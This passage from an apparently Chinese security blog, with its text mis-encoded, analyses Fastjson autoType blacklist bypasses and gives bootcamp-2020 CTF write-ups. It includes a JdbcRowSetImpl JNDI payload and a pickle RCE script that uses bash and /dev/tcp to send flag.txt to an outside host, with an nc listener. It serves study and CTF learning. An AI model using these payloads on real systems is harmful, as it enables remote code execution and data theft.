â€testâ€:1ï¼Œè¿™å°†ä¼šä¸»åŠ¨è°ƒç”¨setTestã€‚<br>å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setTest</span><span class="params">(String test)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.test = test;</span><br><span class="line">    System.out.println(<span class="string">"setTest Method called!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String json=<span class="string">"&#123;\"name\":\"byc_404\",\"phone\":&#123;\"phoneNumber\":\"123123123\"&#125;,\"test\":\"1\"&#125;"</span>;</span><br><span class="line">Person p = JSON.parseObject(json, Person<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">System.out.println(p);</span><br><span class="line"></span><br><span class="line"><span class="comment">//output:</span></span><br><span class="line"><span class="comment">//setTest Method called!</span></span><br><span class="line"><span class="comment">//byc_404:123123123</span></span><br></pre></td></tr></table></figure><p><strong>æˆ‘ä»¬åœ¨åˆ©ç”¨@typeæ„é€ æœ‰å±å®³çš„åˆ©ç”¨é“¾æ—¶ï¼Œä¸»è¦å°±æ˜¯æŸ¥æ‰¾æœ‰å±å®³çš„æ— å‚æ•°çš„æ„é€ å‡½æ•°ã€ç¬¦åˆæ¡ä»¶çš„getterå’Œsetterã€‚</strong></p><h2 id="1-2-24-ä¿®å¤-bypass"><a href="#1-2-24-ä¿®å¤-bypass" class="headerlink" title="1.2.24 ä¿®å¤ bypass"></a>1.2.24 ä¿®å¤ bypass</h2><p>ç„¶åæ”¹ä¸‹mavené‡Œfastjsonä¾èµ–çœ‹çœ‹é«˜ä¸€ä¸ªç‰ˆæœ¬çš„fastjsoné˜²æŠ¤ã€‚å‘ç°å¤šäº†ä¸€ä¸ªcheckAutoTypeæ–¹æ³•ã€‚å½“ç„¶è¿™ä¸ªç‰ˆæœ¬åŒæ—¶éœ€è¦æ‰‹åŠ¨å¼€å¯autoType.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>.autoTypeSupport || expectClass != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    String deny;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">        deny = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">            <span class="keyword">return</span> TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">        deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">        <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåšäº†ä¸€æ¬¡ç™½åå•ä¸€æ¬¡é»‘åå•çš„æ£€æŸ¥ã€‚ä¼˜å…ˆè½½å…¥æ‰‹å·¥é…ç½®çš„ç™½åå•ç±»ï¼Œå¹¶å¯¹é»‘åå•ç±»çˆ†å‡ºå¼‚å¸¸ã€‚<br>ç„¶ååé¢ç»§ç»­è°ƒç”¨æ—¶,å¦‚æœä¸ç¬¦åˆå‰é¢çš„æƒ…å†µï¼Œåé¢å°±ä¼šè¿›å…¥è¿™ä¸€æ®µ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.acceptList.length; ++i) &#123;</span><br><span class="line">    accept = <span class="keyword">this</span>.acceptList[i];</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">        clazz = TypeUtils.loadClass(typeName, <span class="keyword">this</span>.defaultClassLoader);</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›<code>loadClass</code>.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">'['</span>) &#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>)) &#123;</span><br><span class="line">        String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                ......</span><br></pre></td></tr></table></figure><p>åœ¨é»‘åå•æ£€æµ‹ä¹‹åï¼Œå½“å¼€å¤´æœ‰<code>[</code>æˆ–è€…å¼€å¤´æœ‰<code>L</code>å’Œç»“å°¾æœ‰<code>;</code>æ—¶ä¼šå»æ‰è¿™äº›å­—ç¬¦ï¼Œä»è€Œé€ æˆäº†é»‘åå•çš„ç»•è¿‡ã€‚å› ä¸ºå®ƒæ˜¯ç”¨startswithæ£€æµ‹é»‘åå•çš„ã€‚</p><h2 id="1-2-42-bypass"><a href="#1-2-42-bypass" class="headerlink" title="1.2.42 bypass"></a>1.2.42 bypass</h2><p>ç„¶åä¸Šé¢é‚£ä¸ªbypassçš„ä¿®å¤ä¸»è¦æ˜¯</p><p><img src="/2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/0.PNG" class="lazyload" data-srcset="%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æŠŠé»‘åå•å…¨éƒ¨æ¢æˆhashé˜²æ­¢æ·±å…¥æ˜¯è¿™ä¸ªç‰ˆæœ¬çš„ç‰¹ç‚¹,åŒæ—¶ä¸Šé¢è¿™ä¸ªä»£ç çš„ä½œç”¨æ˜¯å¦‚æœæ»¡è¶³æŸä¸ªæ¡ä»¶çš„è¯å°±å»æ‰é‚£äº›<code>Lxxx;</code>çš„å‰åç¬¬ä¸€ä¸ªå­—ç¬¦ã€‚<br>ç„¶è€Œä¿®å¤æ²»æ ‡ä¸æ²»æœ¬ï¼Œè¯´å®è¯æœ‰ç‚¹è ¢,è¿™é‡Œåªéœ€è¦<code>LLxxx;;</code>å°±èƒ½ç»•äº†ã€‚<br>è€Œä¸”é»‘åå•hashä¹Ÿæœ‰dalao æµ‹è¿‡çš„ã€‚ä¹‹å‰çœ‹LandGreyä½¬æ”¶è—è¿‡ï¼Œ<br><a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p><h2 id="1-2-47-bypass"><a href="#1-2-47-bypass" class="headerlink" title="1.2.47 bypass"></a>1.2.47 bypass</h2><p>1.2.48ä»¥å‰çš„checkAutoTyyeæœ‰è¿™æ ·ä¸€æ®µä»£ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (Arrays.binarySearch(<span class="keyword">this</span>.denyHashCodes, hash) &gt;= <span class="number">0</span> &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"autoType is not support. "</span> + typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; getClassFromMapping(String className) &#123;</span><br><span class="line">    <span class="keyword">return</span> (Class)mappings.get(className);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¾ˆå¥‡æ€ªçš„ifçš„æ¡ä»¶å¯¼è‡´ï¼šå³ä½¿å‰é¢æœåˆ°äº†é»‘åå•é‡Œçš„ç±»ï¼Œå¦‚æœmappingsé‡Œé¢å­˜åœ¨è¿™ä¸ªç±»,é‚£ä¹ˆä»å¯ä»¥è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚<br>è¿™é‡Œçš„mappingsæ˜¯fastjsonææ—©è½½å…¥çš„ä¸€äº›ç¼“å­˜ç±»</p><p>é‚£ä¹ˆå‡å¦‚å¯ä»¥å°†æ¶æ„ç±»åŠ å…¥mappingså°±èƒ½æœ‰ç»•è¿‡çš„æ•ˆæœäº†ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz == <span class="keyword">null</span>) &#123;</span><br><span class="line">    clazz = <span class="keyword">this</span>.deserializers.findClass(typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (expectClass != <span class="keyword">null</span> &amp;&amp; clazz != HashMap<span class="class">.<span class="keyword">class</span> &amp;&amp; !<span class="title">expectClass</span>.<span class="title">isAssignableFrom</span>(<span class="title">clazz</span>)) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"type not match. "</span> + typeName + <span class="string">" -&gt; "</span> + expectClass.getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é’ˆå¯¹deserializers.findClass,è¿™é‡Œç±»ä¸­æœ‰ä¸€ä¸ªåˆå§‹æ–¹æ³•ï¼Œåœ¨deserializersé‡Œé¢é¢„å…ˆå¡«å……äº†ä¸€äº›ç±»ä¸å…¶ååºåˆ—åŒ–å™¨çš„å®ä¾‹ã€‚</p><p><img src="/2020/10/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E6%B7%B1%E5%85%A5/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å…¶ä¸­åŒ…æ‹¬ä¸€ä¸ª</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.deserializers.put(Class<span class="class">.<span class="keyword">class</span>, <span class="title">MiscCodec</span>.<span class="title">instance</span>)</span>;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹åœ¨ç»è¿‡autotypeæ£€æŸ¥åMiscCodecè¿™ä¸ªååºåˆ—åŒ–å™¨æ˜¯æ€ä¹ˆå¤„ç†Class.classçš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (clazz == Class<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ<code>TypeUtils.loadClass</code>éå¸¸å¥½ç”¨.ä»–å°†ä½¿ç”¨ClassLoader.loadClassæˆ–Class.forNameæ¥è½½å…¥ç±»ï¼Œåœ¨è¿™ä¸€è¿‡ç¨‹ä¸­ï¼Œæ¶‰åŠåˆ°äº†mappingsçš„æ“ä½œ,å³è°ƒç”¨äº†<code>mappings.put(className,clazz)</code>.é‚£ä¹ˆè¿™æ ·çš„è¯ä¼šç›´æ¥å°†è½½å…¥åçš„å¯¹è±¡å¡«å…¥mappingsã€‚</p><p>é‚£ä¹ˆåªè¦æå‰å°†æ¶æ„ç±»è½½å…¥mappingså°±å¥½äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json = <span class="string">"&#123;&#123;\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"&#125;,&#123;\"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\": \"ldap://localhost:1389/Exploit\",\"autoCommit\": true&#125;&#125;"</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bootcamp-2020&amp;&amp;mctf-2020</title>
      <link href="2020/10/05/bootcamp-2020&amp;mctf-2020/"/>
      <url>2020/10/05/bootcamp-2020&amp;mctf-2020/</url>
      
        <content type="html"><![CDATA[<p>  å›½åº†æ”¾å‡ä¸€ç›´åœ¨åˆ·é¢˜,å¤§æ¦‚æ˜¯å› ä¸ºå›½èµ›è‡ªå·±æ‰“çš„å¤ªçƒ‚äº†å§â€¦..æ„Ÿè§‰æœ‰ä¸å°‘ä¸œè¥¿è¿˜æ˜¯å¯ä»¥ç²¾è¿›çš„ã€‚</p><p>  ç„¶åå¤´å‡ å¤©æ€¼äº†ä¸‹htbçš„å‡ é“challenge.ä¸€ä¸ªåšäº†å¾ˆä¹…çš„é¢˜ç»ˆäºæ€¼å‡ºæ¥äº†,è¿˜æœ‰ä¸€é“æ–°é¢˜å¡ä½äº†,å¦ä¸€é“éš¾é¢˜ä»¥ä¸ºæœ‰äº†çªç ´ç»“æœå‘ç°æºç æ”¹äº†ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ä¸è¿‡æœ€åç»ˆäºæ€¼å‡ºæ¥äº†2333.äºæ˜¯è¿™ä¸¤å¤©å°±æ‰“äº†ä¸‹ctftimeä¸Šçš„ä¸¤ä¸ªctfæ”¾æ¾ä¸‹ã€‚ bootcamp-2020æ˜¯b01lersåŠçš„æ–°æ‰‹èµ›è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„,å°±æ˜¯luaé‚£é¢˜æˆ‘æ€ä¹ˆä¹Ÿæ²¡æƒ³åˆ°å®ƒwebsocketç«¯å£æ˜¯å¯¹å¤–çš„ã€‚å¦ä¸€ä¸ªm*ctf2020æŒºæœ‰æ„æ€ï¼Œéš¾åº¦æœ‰ç‚¹é«˜ã€‚è€Œä¸”å…¶ä¸­é™¤äº†webè¿™ä¸ªåˆ†ç±»è¿˜æœ‰ä¸“é—¨ä¸€ä¸ªååºåˆ—åŒ–åˆ†ç±»ï¼Œæ¯”è¾ƒæœ‰è¶£ã€‚ç›®å‰ä»–ä»¬éƒ½å·²ç»å¼€æ”¾ä»“åº“ï¼Œæ„Ÿå…´è¶£çš„ä¹Ÿå¯ä»¥å»çœ‹çœ‹ :)<br><a href="https://github.com/b01lers/bootcamp-2020" target="_blank" rel="noopener">https://github.com/b01lers/bootcamp-2020</a></p><p><a href="https://gitlab.com/mctf/quals-2020" target="_blank" rel="noopener">https://gitlab.com/mctf/quals-2020</a></p><h2 id="bootcampCTF-2020"><a href="#bootcampCTF-2020" class="headerlink" title="bootcampCTF-2020"></a>bootcampCTF-2020</h2><p>åšé¢˜æ—¶ç®€å•åšçš„ç¬”è®°ã€‚æ‰€ä»¥æ²¡å›¾ã€‚å°†å°±çœ‹å§</p><h3 id="Find-That-Data"><a href="#Find-That-Data" class="headerlink" title="Find That Data!"></a>Find That Data!</h3><p>æ•´ä½“ä¸Šæ˜¯ä¸ªé™æ€åŠŸèƒ½ã€‚é¦–å…ˆç™»é™†ç•Œé¢jsä¸­æç¤ºå­˜åœ¨<code>/maze</code>è·¯ç”±ã€‚æ¥ä¸‹æ¥å‘ç°maze.jsä¸­å®šä¹‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_data</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (x === <span class="number">1</span> &amp;&amp; y === maxRows) &#123;</span><br><span class="line">    $.post(<span class="string">"/mem"</span>, &#123; <span class="attr">token</span>: $(<span class="string">"#token"</span>).html() &#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">      alert(<span class="string">"Memory: "</span> + data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>post<code>/mem</code>ä¼ é€’<code>token=xxx</code>å³å¯ã€‚tokené€šè¿‡è®¿é—®<code>/token</code>å³å¯è·å¾—ã€‚å¤§æ¦‚å‡ ç§’åˆ·æ–°ä¸€æ¬¡ã€‚</p><h3 id="Programs-Only"><a href="#Programs-Only" class="headerlink" title="Programs Only"></a>Programs Only</h3><p>å®è¯è¯´çœŸçš„è„‘æ´ã€‚è¦ä¸æ˜¯å› ä¸ºæƒ³èµ·æ¥å›½é™…èµ›ç»å¸¸æœ‰è¿™ç§pythonåç«¯æ”¾robots.txtçš„æ“ä½œæˆ‘çœŸæä¸å‡ºæ¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: Program</span><br><span class="line">Allow: &#x2F;program&#x2F;</span><br><span class="line"></span><br><span class="line">User-agent: Master Control Program 0000</span><br><span class="line">Allow: &#x2F;program&#x2F;control</span><br></pre></td></tr></table></figure><p>æ”¹UAè®¿é—®åä¸€ä¸ªå³å¯</p><h3 id="Reindeer-Flotilla"><a href="#Reindeer-Flotilla" class="headerlink" title="Reindeer Flotilla"></a>Reindeer Flotilla</h3><p>flagåœ¨åŠ äº†æ··æ·†çš„jsé‡Œ</p><h3 id="First-Day-Inspection"><a href="#First-Day-Inspection" class="headerlink" title="First Day Inspection"></a>First Day Inspection</h3><p>flagä¸€éƒ¨åˆ†åœ¨åŠ äº†æ··æ·†çš„jsé‡Œå‰©ä¸‹çš„å››å¤„æ‰¾æ‰¾å°±å®Œäº†ã€‚</p><h3 id="EnFlaskCom"><a href="#EnFlaskCom" class="headerlink" title="EnFlaskCom"></a>EnFlaskCom</h3><p>æœ‰ç‚¹æ„æ€ã€‚ç»™äº†ä¸¤ä¸ªcookie.ä¸€ä¸ªcookie useræ˜æ˜¾æ˜¯pickleåºåˆ—åŒ–æ•°æ®çš„16è¿›åˆ¶ã€‚ä¸è¿‡å¦ä¸€ä¸ªcookie signatureåªèƒ½çœ‹å‡ºæ˜¯256ä½ã€‚ä¸çŸ¥é“ç®—æ³•ã€‚</p><p>å­˜åœ¨æŠ¥é”™ï¼Œé‚£ä¹ˆå¯ä»¥ç®€å•å°è¯•æ›´æ¢cookieçˆ†å‡ºéƒ¨åˆ†æºç ã€‚</p><p>äºæ˜¯ç–¯ç‹‚fuzz.å¼€å§‹åªå•çº¯æ›´æ”¹cookieçš„æ•°å€¼è¯ï¼Œè§¦å‘æŠ¥é”™åªèƒ½å¾—åˆ°éƒ¨åˆ†è¯­å¥ã€‚å°±æ˜¯çŸ¥é“ä»–ä¼šè°ƒç”¨è‡ªå®šä¹‰çš„<code>sign()</code>å‡½æ•°è®¡ç®—userçš„ç­¾åå¹¶ä¸cookieä¸­çš„signatureè¿›è¡Œassertæ–­è¨€ã€‚é‚£ä¹ˆæ˜¾ç„¶éœ€è¦æŠ¥é”™å¸¦å‡ºsignè¿™ä¸ªå‡½æ•°çš„æºç ã€‚</p><p>æ˜¾ç„¶æˆ‘ä»¬åªæ˜¯æ›´æ”¹cookieçš„å€¼çš„è¯,ä¼ é€’ç»“æœæ€»æ˜¯å­—ç¬¦ä¸²ã€‚é‚£ä¹ˆsignå‡½æ•°æ˜¯ä¸ä¼šæŠ¥é”™çš„ï¼Œè‡ªç„¶å°±ä¸ä¼šçˆ†å‡ºæºç ã€‚<br>æ•…å°†cookieæ”¹ä¸ºæ•°ç»„ä¼ é€’ä¸‹ã€‚å°±èƒ½å¾—åˆ°signæºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(msg) <span class="keyword">is</span> <span class="keyword">not</span> bytes:</span><br><span class="line">        msg = bytes(msg, <span class="string">'utf8'</span>)</span><br><span class="line">        keyPair = RSA.RsaKey(n=<span class="number">122929120347181180506630461162876206124588624246894159983930957362668455150316050033925361228333120570604695808166534050128069551994951866012400864449036793525176147906281580860150210721340627722872013368881325479371258844614688187593034753782177752358596565495566940343979199266441125486268112082163527793027</span>, e=<span class="number">65537</span>, d=<span class="number">51635782679667624816161506479122291839735385241628788060448957989505448336137988973540355929843726591511533462854760404030556214994476897684092607183504108409464544455089663435500260307179424851133578373222765508826806957647307627850137062790848710572525309996924372417099296184433521789646380579144711982601</span>, p=<span class="number">9501029443969091845314200516854049131202897408079558348265027433645537138436529678958686186818098288199208700604454521018557526124774944873478107311624843</span>, q=<span class="number">12938505355881421667086993319210059247524615565536125368076469169929690129440969655350679337213760041688434152508579599794889156578802099893924345843674089</span>, u=<span class="number">3286573208962127166795043977112753146960511781843430267174815026644571470787675370042644248296438692308614275464993081581475202509588447127488505764805156</span>)</span><br><span class="line">        signer = pkcs1_15.new(keyPair)</span><br><span class="line">        hsh = SHA384.new()</span><br><span class="line">        hsh.update(msg)</span><br><span class="line">        signature = signer.sign(hsh)</span><br><span class="line">        <span class="keyword">return</span> signature</span><br></pre></td></tr></table></figure><p>è¿›è€Œè°ƒç”¨pickle RCEå³å¯.æœ¬æ¥ä¸æƒ³rceçš„ç»“æœå‘ç°<code>is_admin()</code>è¿”å›Trueæ²¡æ”¹æˆã€‚å¹²è„†å°±ç›´æ¥rceäº†<br><code>nc -lvkp 9001</code>ç›‘å¬<br>ç„¶å<code>bash -c &quot; cat flag.txt &gt; /dev/tcp/ip/port&quot;</code>å³å¯ã€‚é¿å…å¼¹shellé€ æˆå¹²æ‰°ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> pkcs1_15</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA384</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> type(msg) <span class="keyword">is</span> <span class="keyword">not</span> bytes:</span><br><span class="line">        msg = bytes(msg, <span class="string">'utf8'</span>)</span><br><span class="line">        keyPair = RSA.RsaKey(n=<span class="number">122929120347181180506630461162876206124588624246894159983930957362668455150316050033925361228333120570604695808166534050128069551994951866012400864449036793525176147906281580860150210721340627722872013368881325479371258844614688187593034753782177752358596565495566940343979199266441125486268112082163527793027</span>, e=<span class="number">65537</span>, d=<span class="number">51635782679667624816161506479122291839735385241628788060448957989505448336137988973540355929843726591511533462854760404030556214994476897684092607183504108409464544455089663435500260307179424851133578373222765508826806957647307627850137062790848710572525309996924372417099296184433521789646380579144711982601</span>, p=<span class="number">9501029443969091845314200516854049131202897408079558348265027433645537138436529678958686186818098288199208700604454521018557526124774944873478107311624843</span>, q=<span class="number">12938505355881421667086993319210059247524615565536125368076469169929690129440969655350679337213760041688434152508579599794889156578802099893924345843674089</span>, u=<span class="number">3286573208962127166795043977112753146960511781843430267174815026644571470787675370042644248296438692308614275464993081581475202509588447127488505764805156</span>)</span><br><span class="line">        signer = pkcs1_15.new(keyPair)</span><br><span class="line">        hsh = SHA384.new()</span><br><span class="line">        hsh.update(msg)</span><br><span class="line">        signature = signer.sign(hsh)</span><br><span class="line">        <span class="keyword">return</span> signature</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        s = <span class="string">"""bash -c "cat flag.txt &gt; /dev/tcp/xxx/9001" """</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (s,))</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">user=binascii.hexlify(pickle.dumps(e)).decode()</span><br><span class="line">signature=binascii.hexlify(sign(user)).decode()</span><br><span class="line">r = requests.get(<span class="string">'http://chal.ctf.b01lers.com:3000/flag'</span>,cookies=&#123;<span class="string">'user'</span>:user,<span class="string">'signature'</span>:signature&#125;)</span><br></pre></td></tr></table></figure><p>ç«¯å£å³å¯æ‹¿åˆ°flag</p><h3 